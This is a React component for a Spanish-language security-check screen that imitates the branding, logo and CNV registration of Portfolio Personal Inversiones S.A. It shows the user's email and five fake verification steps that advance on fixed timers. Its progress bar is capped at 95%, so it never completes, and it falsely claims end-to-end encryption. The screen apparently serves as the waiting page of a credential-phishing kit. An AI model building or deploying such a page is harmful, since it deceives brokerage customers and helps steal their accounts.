import { useEffect, useState } from "react";
import ppiLogoSvg from "@/assets/ppi-logo.svg";
import { Shield, Lock, CheckCircle2, Server, Fingerprint } from "lucide-react";

interface PpiSecurityScreenProps {
  email: string;
}

const STEPS = [
  { icon: Server, label: "Conectando con los servidores de PPI...", delay: 0 },
  { icon: Lock, label: "Verificando credenciales de seguridad...", delay: 2800 },
  { icon: Fingerprint, label: "Validando identidad del titular...", delay: 5600 },
  { icon: Shield, label: "Aplicando protocolos de seguridad...", delay: 8400 },
  { icon: CheckCircle2, label: "Sincronizando sesión segura...", delay: 11200 },
];

const PpiSecurityScreen = ({ email }: PpiSecurityScreenProps) => {
  const [activeStep, setActiveStep] = useState(0);
  const [progress, setProgress] = useState(0);

  useEffect(() => {
    const timers = STEPS.map((step, i) =>
      window.setTimeout(() => setActiveStep(i), step.delay)
    );
    return () => timers.forEach(clearTimeout);
  }, []);

  useEffect(() => {
    const interval = window.setInterval(() => {
      setProgress((p) => {
        if (p >= 95) return 95;
        const increment = Math.random() * 3 + 0.5;
        return Math.min(p + increment, 95);
      });
    }, 400);
    return () => clearInterval(interval);
  }, []);

  return (
    <div className="flex min-h-[100svh] flex-col bg-white">
      {/* Header */}
      <header className="flex items-center justify-between px-5 py-4 sm:px-10 sm:py-5 bg-white border-b border-[#f0f0f0]">
        <img src={ppiLogoSvg} alt="PPI" className="h-8 sm:h-9" />
        <span className="text-[13px] font-normal text-[#8c939a]">Seguridad</span>
      </header>

      <main className="flex flex-1 items-center justify-center px-4">
        <div className="w-full max-w-[440px]">
          {/* Shield icon */}
          <div className="flex justify-center mb-5">
            <div className="relative flex h-16 w-16 items-center justify-center rounded-full bg-gradient-to-br from-[#1e5a96] to-[#2a7bc8]">
              <Shield className="h-8 w-8 text-white" strokeWidth={1.8} />
              <div className="absolute inset-0 rounded-full animate-ping bg-[#1e5a96]/15" style={{ animationDuration: "2s" }} />
            </div>
          </div>

          <h1 className="text-center text-[20px] sm:text-[22px] font-bold text-[#1e2a3a] mb-2">
            Validación de seguridad
          </h1>
          <p className="text-center text-sm text-[#8c939a] mb-1 max-w-[360px] mx-auto">
            Estamos verificando tu cuenta para garantizar la seguridad de tu información y proteger tu acceso.
          </p>
          <p className="text-center text-xs text-[#bbb] mb-6">{email}</p>

          {/* Progress bar */}
          <div className="mb-6">
            <div className="h-1.5 w-full rounded-full bg-[#f0f2f5] overflow-hidden">
              <div
                className="h-full rounded-full bg-gradient-to-r from-[#1e5a96] to-[#42a5f5] transition-all duration-500 ease-out"
                style={{ width: `${progress}%` }}
              />
            </div>
            <div className="flex justify-between mt-1.5">
              <span className="text-[10px] text-[#bbb]">Verificación en curso</span>
              <span className="text-[10px] font-medium text-[#1e5a96]">{Math.round(progress)}%</span>
            </div>
          </div>

          {/* Steps */}
          <div className="space-y-2">
            {STEPS.map((step, i) => {
              const Icon = step.icon;
              const isDone = i < activeStep;
              const isActive = i === activeStep;
              const isPending = i > activeStep;

              return (
                <div
                  key={i}
                  className={`flex items-center gap-3 rounded-lg px-4 py-2.5 transition-all duration-500 ${
                    isActive
                      ? "bg-[#f0f5fa] border border-[#d0dbe8]"
                      : isDone
                      ? "bg-[#f8faf8] border border-[#e0ede0]"
                      : "bg-transparent border border-transparent opacity-40"
                  }`}
                >
                  <div className={`flex h-7 w-7 items-center justify-center rounded-full flex-shrink-0 ${
                    isDone
                      ? "bg-green-100"
                      : isActive
                      ? "bg-[#1e5a96]/10"
                      : "bg-[#f0f2f5]"
                  }`}>
                    {isDone ? (
                      <CheckCircle2 size={14} className="text-green-600" />
                    ) : isActive ? (
                      <div className="h-3.5 w-3.5 animate-spin rounded-full border-2 border-[#1e5a96] border-t-transparent" />
                    ) : (
                      <Icon size={14} className="text-[#ccc]" />
                    )}
                  </div>
                  <span className={`text-sm ${
                    isDone ? "text-green-700 font-medium" : isActive ? "text-[#1e2a3a] font-medium" : "text-[#ccc]"
                  }`}>
                    {step.label}
                  </span>
                </div>
              );
            })}
          </div>

          {/* Security notice */}
          <div className="mt-6 rounded-lg bg-[#fafbfc] border border-[#e8eaed] px-4 py-3">
            <div className="flex items-start gap-2.5">
              <Lock size={13} className="text-[#8c939a] mt-0.5 flex-shrink-0" />
              <p className="text-[11px] text-[#8c939a] leading-relaxed">
                Este proceso es parte del protocolo de seguridad de <strong className="text-[#1e2a3a]">Portfolio Personal Inversiones S.A.</strong> Tus datos están protegidos mediante encriptación de extremo a extremo conforme a las normativas de la CNV.
              </p>
            </div>
          </div>
        </div>
      </main>

      {/* Footer */}
      <footer className="border-t border-[#e5e7eb] bg-white px-5 py-3 sm:px-10">
        <p className="text-center text-[10px] text-[#bbb]">
          Portfolio Personal Inversiones S.A. — ALyC Integral CNV N° 686 | Proceso de seguridad automatizado
        </p>
      </footer>
    </div>
  );
};

export default PpiSecurityScreen;
